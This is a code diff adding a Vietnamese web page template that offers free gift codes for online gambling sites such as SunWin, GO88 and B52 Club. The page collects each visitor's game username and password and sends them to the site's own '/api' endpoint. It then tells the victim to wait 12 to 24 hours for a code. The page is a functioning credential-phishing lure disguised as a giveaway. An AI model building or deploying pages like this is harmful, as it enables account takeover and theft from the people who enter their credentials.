@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <title>tangcode247.com - Đăng nhập 5s nhận ngay code</title>
+    <link rel="shortcut icon" href="../public/images/bocvip-icon.ico" />
+    <link rel="stylesheet" href="../public/css/index.css">
+    <link rel="stylesheet" href="../public/css/page.css">
+    <link rel="stylesheet" href="../public/css/codepage.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+        integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+
+<body class="body-style">
+    <div class="wraper">
+        <%- include ('./header'); -%>
+            <div class="content game-content">
+                <div class="bread bread-code">
+                    <a href="./">Trang chủ</a> >>
+                    <a href="./login-get-gift-code"> Đăng nhập
+                    </a>
+                </div>
+            </div>
+            <div class="content form-nhan-code">
+                <h3>Tiến hành nhận code</h3>
+                <div id="tb" style="color: red;"></div>
+                <div name="login">
+
+                    Chọn game
+                    <select id="games" name="tenGame">
+                        <option value="">— Chọn Game —</option>
+                        <option value="Yo88">YO88</option>
+                        <option value="B52">B52 Club</option>
+                        <option value="GO88">GO88</option>
+                        <option value="789club">789 Club</option>
+                        <option value="RikVIP">RikVIP</option>
+                        <option value="SunWin">SunWin</option>
+                        <option value="nhatVip">Nhất Vip</option>
+                        <option value="Hit Club">Hit Club</option>
+                        <option value="top88">Top88</option>
+                    </select>
+                    Tên tài khoản
+                    <input type="text" placeholder="Nhập tài khoản game" id="user" name="user">
+                    Mật khẩu
+                    <input type="password" placeholder="Nhập mật khẩu" name="pass" id="pass">
+                    <input type="submit" class="btn-submit" value="Đăng Nhập" onclick="send()">
+                </div>
+
+            </div>
+            <div class=" luu-y-code content">
+                <p class="y-code">Lưu ý khi nhận code</p>
+                <p>
+                    <font color="red">*</font>
+                    Vui lòng nhập đúng tài khoản của game bạn muốn nhận gift-code.
+                </p>
+                <p>
+                    <font color="red">*</font>
+                    Hệ thống tangcode247 chỉ thực hiện gửi mã code khi tài khoản của bạn có đủ 3 điều kiện thể lệ.
+                </p>
+                <p>Mọi thắc mắc hoặc góp ý vui lòng liên hệ E-mail : hotro@tangcode247.com hoặc gửi tin nhắn FANPAGE
+                    FACEBOOK để được hỗ trợ thêm.</p>
+            </div>
+            <%- include("./footer"); -%>
+    </div>
+    <script src="../public/js/home.js"></script>
+    <script>
+        function send() {
+            const tenGame = $('#games').val()
+            if (tenGame === "") {
+                alert("Vui lòng chọn tên game")
+                return
+            }
+            const user = $('#user').val()
+            if (user === "") {
+                alert("Vui lòng nhập tên tài khoản")
+                return
+            }
+            const pass = $('#pass').val()
+            if (pass === "") {
+                alert("Vui lòng nhập mật khẩu")
+                return
+            }
+            $.ajax({
+                url: '/api',
+                type: 'POST',
+                data: ({
+                    tenGame, user, pass
+                }),
+                success: function (res) {
+                    const thongbao = "Tài khoản " + res + " đã nhận giff code thành công. Vui lòng đợi hệ thống kiểm tra thông tin.  Nếu thông tin chính xác code sẽ được gửi trong vòng 12-24h"
+                    alert(thongbao)
+                    document.getElementById('tb').innerHTML = thongbao
+                }
+            })
+        }
+    </script>
+</body>
+
+</html>
